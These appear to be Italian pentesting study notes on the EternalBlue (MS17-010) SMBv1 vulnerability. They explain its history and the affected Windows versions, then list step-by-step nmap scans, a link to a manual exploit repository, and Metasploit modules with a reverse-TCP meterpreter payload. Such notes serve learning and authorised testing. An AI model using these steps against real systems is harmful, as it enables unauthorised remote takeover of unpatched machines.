EternalBlue è un exploit di Microsoft che è stato sviluppato dalla NSA (National Security Agency) per la **raccolta** di **informazioni** e che **consente l'accesso** **remoto** ai dati contenuti nei **dispositivi** **Microsoft.**

è stato utilizzato per lanciare **attacchi informatici** devastanti in tutto il mondo, **come WannaCry**, **Petya/NotPetya e Indexsinas.**

# **Come funziona EternalBlue?**

L'[exploit](https://www.avg.com/it/signal/computer-security-exploits) EternalBlue (noto anche come **MS17-010**) sfrutta una **vulnerabilità** nel **protocollo** di condivisione dei file di rete **SMBv1** nei computer Microsoft. Il protocollo di rete Server Message Block versione 1 consente ai computer di condividere file con stampanti, porte e altri computer Windows. Tuttavia, SMBv1 contiene dei bug che consentono agli [hacker](https://www.avg.com/it/signal/what-is-hacking) di inviare nella rete pacchetti di dati dannosi. Una volta all'interno della rete, il malware può infettare tutti i dispositivi a essa connessi, e non solo.

- **Colpisce i seguenti sistemi operativi**
Windows Vista
Windows 7
Windows Server 2008
Windows 8.1
Windows Server 2012
Windows 10
Windows Server 2016

Molti **sistemi operativi risultano** ancora **non** **patchati** a questa vulnerabilità.

MSF ha moduli che permettono di verificare se è presente questa vulnerabilità nei SO target e di exploitarla.

# Roadmap

1. **nmap -T4 -sS -A -vvv -p- -Pn --version-intensity 8 --osscan-guess IP_TARGET**
2. **nmap -sV -p 80 --script=smb-vuln-ms17-010 IP_TARGET** per vedere se il sistema target è vulnerabile ad EternalBlue

EXPLOIT MANUALE (senza MSF)

1. https://github.com/3ndG4me/AutoBlue-MS17-010 download in una cartella questa repository e seguire il tutorial

EXPLOIT CON MSF (molto piu veloce)

1. **search eternalblue**
2. **use auxiliary/scanner/smb/smb_ms17_010** serve per vedere se il target è vulnerabile
3. **use exploit/windows/smb/ms17_010_eternalblue** modulo perexploit
4. di default setta il payload: **windows/x64/meterpreter/revers_tcp** da cambiare se SO x86 o necessitiamo di un altra shell
5. **settiamo le options**
6. **run**
